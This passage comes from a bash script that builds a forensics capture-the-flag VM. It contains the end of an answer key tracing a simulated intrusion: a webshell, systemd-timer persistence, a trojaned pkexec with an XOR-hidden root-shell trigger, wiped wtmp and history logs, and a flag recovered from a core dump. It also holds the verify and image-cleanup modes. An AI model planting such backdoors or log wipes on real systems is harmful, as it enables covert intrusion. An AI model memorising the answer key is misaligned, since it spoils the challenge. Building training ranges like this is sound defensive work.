  hidden ${PERSIST_SCRIPT}. Distinguish from the legit nodebackup.timer.
  .sysupd keeps pkexec SUID -> look at pkexec next.

S3 PRIVESC  (pivot: backdoored pkexec = root)
  $TROJAN_TARGET is trojaned. debsums -s ${PKG:-<pkg>} / dpkg --verify ${PKG:-<pkg>} flags it.
  original sha256: ${ORIG_PKEXEC_SHA:-<captured at build>}
  strings shows PKEXEC_AUTH + /bin/bash; the trigger is XOR(0x42)-obfuscated.
  decoded trigger = $BACKDOOR_MAGIC  (env PKEXEC_AUTH=$BACKDOOR_MAGIC -> root shell)

S4 COVER-UP  (pivot: the wipe -> what was hidden)
  /var/log/wtmp + lastlog zeroed (0 bytes) vs a full auth.log = a WIPE.
  /root/.bash_history cleared; $L400_USER history intact (contrast).
  Stamped $T_S4 (last action). Timeline -> the surviving $EXFIL_DIR.

S5 EXFIL = FLAG
  $EXFIL_DIR/ : loot.tgz (what they took) + a surviving core dump.
  strings $EXFIL_DIR/core.* | grep number{   ->  $FLAG
  (flag is binary-only: 'grep -rI number{' on text finds nothing.)

ANTI-SHORTCUT: text-grep fails; chain is timeline-ordered; binaries trojaned;
the end is wiped + must be reconstructed from the core.
==========================================================================
KEY
  chmod 600 "$f"
  cat "$f"
  echo
  warn "answer key written to $f - COPY IT OFF THE VM now; imageprep will delete it."
}

# ----------------------------------------------------------------------------
# VERIFY MODE - self-solve sanity on the built box (run before imaging)
# ----------------------------------------------------------------------------
do_verify(){
  phase "VERIFY - walk the chain on the built box"
  local pass=0 fail=0
  chk(){ if eval "$2" >/dev/null 2>&1; then ok "$1"; pass=$((pass+1)); else warn "FAIL: $1"; fail=$((fail+1)); fi; }

  chk "S1 webshell on disk" "[ -f /var/www/html/uploads/sess_4f1c.php ]"
  chk "S1 successful upload in access.log" "grep -q 'POST /upload.php' /var/log/nginx/access.log"
  chk "S2 malicious timer present" "[ -f /etc/systemd/system/${PERSIST_UNIT}.timer ]"
  chk "S2 payload references pkexec" "grep -q pkexec ${PERSIST_SCRIPT}"
  chk "S2 legit timer also present (cover)" "[ -f /etc/systemd/system/nodebackup.timer ]"
  local pkpkg; pkpkg=$(dpkg -S "$TROJAN_TARGET" 2>/dev/null | head -1 | cut -d: -f1)
  chk "S3 pkexec flagged" "m=\$(ls /var/lib/dpkg/info/${pkpkg}*.md5sums 2>/dev/null|head -1); r=\$(grep -E '(^| )usr/bin/pkexec\$' \"\$m\" 2>/dev/null|awk '{print \$1}'|head -1); [ -n \"\$r\" ] && [ \"\$r\" != \"\$(md5sum $TROJAN_TARGET|awk '{print \$1}')\" ]"
  chk "S3 trigger NOT plaintext in pkexec" "! strings $TROJAN_TARGET | grep -q $BACKDOOR_MAGIC"
  chk "S4 wtmp wiped (0 bytes)" "[ ! -s /var/log/wtmp ]"
  chk "S4 root history cleared" "[ ! -s /root/.bash_history ]"
  chk "S4 jhayes history intact" "[ -s /home/$L400_USER/.bash_history ]"
  chk "S5 core dump present" "ls $EXFIL_DIR/core.* >/dev/null 2>&1"
  chk "S5 flag recoverable from core" "grep -aqF '$FLAG' $EXFIL_DIR/core.* 2>/dev/null"
  chk "S5 flag NOT in text (anti-shortcut)" "! grep -rIl 'number{' $EXFIL_DIR 2>/dev/null | grep -q ."

  printf '\n   %s%d passed, %d failed%s\n' "$c_bold" "$pass" "$fail" "$c_reset"
  [ "$fail" -eq 0 ] && ok "chain verified end-to-end - safe to imageprep + image" || die "chain has gaps - fix before imaging."
}

# ----------------------------------------------------------------------------
# IMAGEPREP MODE - final cleanup + zero-fill, right before you image
# ----------------------------------------------------------------------------
do_imageprep(){
  phase "IMAGEPREP - strip build traces, then zero-fill"
  rm -f /var/lib/.l400_built /root/L400_ANSWERKEY.txt
  ok "removed build marker + answer key (must not ship on the image)"
  journalctl --rotate >/dev/null 2>&1 || true
  journalctl --vacuum-time=1s >/dev/null 2>&1 || true
  ok "journal vacuumed (removes build-date service starts)"
  : > /root/.bash_history 2>/dev/null || true
  phase "ZERO-FILL - make the thin disk compress small"
  info "writing zeros to free space (takes a minute)..."
  dd if=/dev/zero of=/zero.fill bs=1M 2>/dev/null || true
  rm -f /zero.fill; sync
  ok "free space zero-filled"
  printf '\n%s NEXT:%s power off cleanly, then on the HOST:\n' "$c_bold" "$c_reset"
  echo "   VBoxManage clonemedium disk <vmdk> relay-07.img --format RAW   # or qemu-img convert"
  echo "   xz -9e -T0 relay-07.img    # -> relay-07.img.xz (~1-1.5 GB target)"
  echo "   sha256sum relay-07.img.xz  # publish alongside the download"
}

build_all(){
  BUILD_DATE="$(date +%Y-%m-%d)"
  preflight
  p2_hostname; p2_user; p2_web_stack; p2_baseline; p2_legit_persistence
  p3_scan_flood; p3_ssh_brute
  p4_initial_access; p5_persistence; p6_privesc; p7_coverup; p8_exfil
  p9_coherence
  printf '\n%s%s━━ BUILD COMPLETE ━━%s\n' "$c_bold" "$c_grn" "$c_reset"
  write_answerkey
  printf '\n%sNEXT:%s 1) sudo MODE=verify bash %s  2) copy the answer key off-box  3) sudo MODE=imageprep bash %s  4) power off + image\n' \
    "$c_bold" "$c_reset" "$(basename "$0")" "$(basename "$0")"
}

case "${MODE:-build}" in
  build)     build_all ;;
  verify)    do_verify ;;
  imageprep) do_imageprep ;;
  answerkey) write_answerkey ;;
  *) die "unknown MODE='${MODE:-}' (use build|verify|imageprep|answerkey)";;
esac
